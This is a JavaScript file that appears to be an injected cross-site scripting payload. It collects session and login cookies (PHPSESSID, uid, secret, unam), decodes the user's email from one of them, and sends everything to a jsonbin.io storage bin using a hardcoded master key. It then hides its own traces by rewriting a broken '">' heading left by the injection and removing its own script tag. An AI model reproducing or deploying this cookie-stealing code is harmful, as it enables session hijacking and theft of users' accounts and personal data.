(function() {
    // First function logic
    var xhr = new XMLHttpRequest(),
        binID, email, req, cookieData = {};

    document.cookie.split('; ').forEach(function(c) {
        var parts = c.split('=');
        if (['secret', 'unam', 'uid', 'PHPSESSID'].includes(parts[0])) {
            cookieData[parts[0]] = parts[1];
            if (parts[0] === 'uid') {
                email = atob(decodeURIComponent(parts[1]));
            }
        }
    });

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            binID = JSON.parse(xhr.responseText)?.metadata?.id;
            if (binID && email) {
                req = new XMLHttpRequest();
                req.onreadystatechange = function() {
                    if (req.readyState === 4) {
                        console.log("Rename response:", req.responseText);
                    }
                };
                req.open("PUT", "https://api.jsonbin.io/v3/b/" + binID + "/meta/name", true);
                req.setRequestHeader("X-Bin-Name", email);
                req.setRequestHeader("X-Master-Key", "$2b$10$.OfJZIPTOgiVyiN./gF6w.9G1rZFeqJiHI88C4Q1/BDu9R8AHC1zW");
                req.send();
            }
        }
    };

    xhr.open('POST', 'https://api.jsonbin.io/v3/b', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader("X-Master-Key", "$2b$10$.OfJZIPTOgiVyiN./gF6w.9G1rZFeqJiHI88C4Q1/BDu9R8AHC1zW");
    xhr.send(JSON.stringify(cookieData));

    // Check for <h1> tags after the DOM is loaded
    document.addEventListener('DOMContentLoaded', function() {
        var h1Elements = document.getElementsByTagName('h1');
        for (var i = 0; i < h1Elements.length; i++) {
            if (h1Elements[i].textContent.trim() === '">') {
                h1Elements[i].textContent = "Raziskava o nečem";
            }
        }
        
        // Remove the specific script by its src
        var specificScript = document.querySelector('script[src="https://enkarman.github.io/enkica/n.js"]');
        if (specificScript) {
            specificScript.parentNode.removeChild(specificScript);
        }
    });

})();
